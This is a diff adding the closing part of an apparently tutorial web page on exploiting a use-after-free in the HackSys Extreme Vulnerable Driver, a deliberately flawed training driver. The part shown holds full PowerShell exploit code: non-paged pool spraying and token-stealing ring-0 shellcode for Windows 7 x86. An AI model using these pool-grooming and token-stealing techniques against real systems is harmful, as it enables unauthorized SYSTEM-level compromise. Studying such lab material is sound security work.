+	echo "[+] Derandomizing NonPagedPool.."
+	$Spray = @()
+	for ($i=0;$i -lt 10000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray1 += $Spray
+	echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
+
+	echo "[+] Allocating sequential objects.."
+	$Spray = @()
+	for ($i=0;$i -lt 5000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray2 += $Spray
+	echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
+
+	echo "[+] Creating non-paged pool holes.."
+	for ($i=0;$i -lt $($IoCo_hArray2.Length);$i+=2) {
+		$CallResult = [EVD]::CloseHandle($IoCo_hArray2[$i])
+		if ($CallResult -ne 0) {
+			$FreeCount += 1
+		}
+	}
+	echo "[+] Free'd $FreeCount IoCo objects!"
+}
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+
+echo "`n[>] Spraying non-paged kernel pool!"
+IoCo-PoolSpray
+
+echo "`n[>] Staging vulnerability.."
+# Allocate UAF Object
+#---
+# 0x222013 - HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
+echo "[+] Allocating UAF object"
+[EVD]::DeviceIoControl($hDevice, 0x222013, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+
+# Free UAF Object
+#---
+# 0x22201B - HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
+echo "[+] Freeing UAF object"
+[EVD]::DeviceIoControl($hDevice, 0x22201B, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+
+# Fake Object allocation
+#---
+# 0x22201F - HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
+echo "[+] Spraying 5000 fake objects"
+$Buffer = [Byte[]](0x41)*0x4 + [Byte[]](0x42)*0x5B + 0x00 # len = 0x60
+for ($i=0;$i -lt 5000;$i++){
+	[EVD]::DeviceIoControl($hDevice, 0x22201F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+}
+
+# Trigger stale callback
+#---
+# 0x222017 - HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
+echo "`n[>] Triggering UAF vulnerability!`n"
+[EVD]::DeviceIoControl($hDevice, 0x222017, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>Let's put a breakpoint in the UseUaFObject function where the callback pointer get called and run our final POC.</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_11.png">
+<p>&nbsp;</p>
+
+<h2 class="title">Game Over<span class="line"></span></h2>
+<p>That's pretty much the whole jam, to weaponize our POC all we need to do is replace the callback pointer with a pointer to our shellcode. For further details please refer to the full exploit below.</p><br />
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern Byte CloseHandle(
+    	IntPtr hObject);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(
+        IntPtr lpAddress,
+        uint dwSize,
+        UInt32 flAllocationType,
+        UInt32 flProtect);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtAllocateReserveObject(
+    	ref IntPtr hObject,
+		UInt32  ObjectAttributes,
+		UInt32 ObjectType);
+}
+"@
+
+function IoCo-PoolSpray {
+	echo "[+] Derandomizing NonPagedPool.."
+	$Spray = @()
+	for ($i=0;$i -lt 10000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray1 += $Spray
+	echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
+
+	echo "[+] Allocating sequential objects.."
+	$Spray = @()
+	for ($i=0;$i -lt 5000;$i++) {
+		$hObject = [IntPtr]::Zero
+		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
+		if ($CallResult -eq 0) {
+			$Spray += $hObject
+		}
+	}
+	$Script:IoCo_hArray2 += $Spray
+	echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
+
+	echo "[+] Creating non-paged pool holes.."
+	for ($i=0;$i -lt $($IoCo_hArray2.Length);$i+=2) {
+		$CallResult = [EVD]::CloseHandle($IoCo_hArray2[$i])
+		if ($CallResult -ne 0) {
+			$FreeCount += 1
+		}
+	}
+	echo "[+] Free'd $FreeCount IoCo objects!"
+}
+
+# Compiled with Keystone-Engine
+# Hardcoded offsets for Win7 x86 SP1
+$Shellcode = [Byte[]] @(
+    #---[Setup]
+    0x60,                               # pushad
+    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
+    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
+    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
+    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
+    #---[Copy System PID token]
+    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
+    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] &lt;-|
+    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
+    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
+    0x75, 0xED,                         # jnz                           ->|
+    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
+    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
+    #---[Recover]
+    0x61,                               # popad
+    0xC3                                # ret
+)
+ 
+# Write shellcode to memory
+echo "`n[>] Allocating ring0 payload.."
+[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
+$ShellcodePointer = [System.BitConverter]::GetBytes($Pointer.ToInt32())
+echo "[+] Payload size: $($Shellcode.Length)"
+echo "[+] Payload address: 0x$("{0:X8}" -f $Pointer.ToInt32())"
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+
+echo "`n[>] Spraying non-paged kernel pool!"
+IoCo-PoolSpray
+
+echo "`n[>] Staging vulnerability.."
+# Allocate UAF Object
+#---
+# 0x222013 - HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
+echo "[+] Allocating UAF object"
+[EVD]::DeviceIoControl($hDevice, 0x222013, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+
+# Free UAF Object
+#---
+# 0x22201B - HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
+echo "[+] Freeing UAF object"
+[EVD]::DeviceIoControl($hDevice, 0x22201B, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+
+# Fake Object allocation
+#---
+# 0x22201F - HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
+echo "[+] Spraying 5000 fake objects"
+$Buffer = $ShellcodePointer + [Byte[]](0x42)*0x5B + 0x00 # len = 0x60
+for ($i=0;$i -lt 5000;$i++){
+	[EVD]::DeviceIoControl($hDevice, 0x22201F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+}
+
+# Trigger stale callback
+#---
+# 0x222017 - HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
+echo "`n[>] Triggering UAF vulnerability!`n"
+[EVD]::DeviceIoControl($hDevice, 0x222017, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelUAF_12.png">
+<p>&nbsp;</p>
+
+</div>
+    </div>
+</div>
+
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
